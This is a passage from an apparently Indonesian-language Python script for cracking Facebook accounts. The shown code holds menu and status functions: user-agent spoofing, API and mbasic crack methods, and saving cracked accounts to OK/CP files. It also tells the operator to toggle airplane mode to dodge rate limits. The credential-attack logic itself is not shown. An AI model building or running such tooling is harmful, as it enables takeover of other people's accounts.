    _dapunta_cici_("%s[%s1%s] %sDapatkan User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s2%s] %sGanti User Agent %s[%sManual%s]"%(_U_,_P_,_U_,_P_,_U_,_P_,_U_))
    _dapunta_cici_("%s[%s3%s] %sGanti User Agent %s[%sSesuaikan HP%s]"%(_U_,_P_,_U_,_P_,_U_,_P_,_U_))
    _dapunta_cici_("%s[%s4%s] %sHapus User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s5%s] %sCek User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s0%s] %sKembali"%(_U_,_P_,_U_,_P_))

### Tampilan Metode
def start_method():
    _dapunta_cici_('\n%s[%s1%s] %sMetode Api'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sMetode Mbasic'%(_U_,_P_,_U_,_P_))

### Tampilan Mulai Crack
def started():
    _dapunta_cici_('%s[%s•%s] %sCrack Sedang Berjalan...'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(_U_,_P_,_U_,_P_))

### Start
if __name__=='__main__':
    os.system('git pull')
    _clear_()
    _folder_()
    _check_recode_(_oscylopsce_,_ascylapsci_,_escylipsce_)

# _dapunta_cici_('%s[%s•%s] %s'%(_U_,_P_,_U_,_P_))
# _dapunta_cici_('%s[%s!%s] %s'%(_M_,_P_,_M_,_P_))
